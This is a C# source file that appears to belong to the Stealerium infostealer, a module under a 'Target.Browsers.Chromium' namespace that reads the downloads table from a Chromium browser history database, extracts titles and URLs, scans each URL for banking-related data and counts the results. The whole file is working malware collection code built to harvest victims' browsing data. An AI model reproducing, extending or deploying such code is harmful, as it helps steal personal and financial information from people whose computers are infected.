using System;
using System.Collections.Generic;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal sealed class Downloads
    {
        /// <summary>
        ///     Get Downloads from chromium based browsers
        /// </summary>
        /// <param name="sHistory"></param>
        /// <returns>List with downloads</returns>
        public static List<Site> Get(string sHistory)
        {
            var scDownloads = new List<Site>();
            try
            {
                // Read data from table
                var sSqLite = SqlReader.ReadTable(sHistory, "downloads");
                if (sSqLite == null) return scDownloads;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    var sSite = new Site
                    {
                        Title = Crypto.GetUtf8(sSqLite.GetValue(i, 2)),
                        Url = Crypto.GetUtf8(sSqLite.GetValue(i, 17))
                    };

                    // Analyze value
                    Banking.ScanData(sSite.Url);
                    Counter.Downloads++;
                    scDownloads.Add(sSite);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Chromium >> Failed collect downloads\n" + ex);
            }

            return scDownloads;
        }
    }
}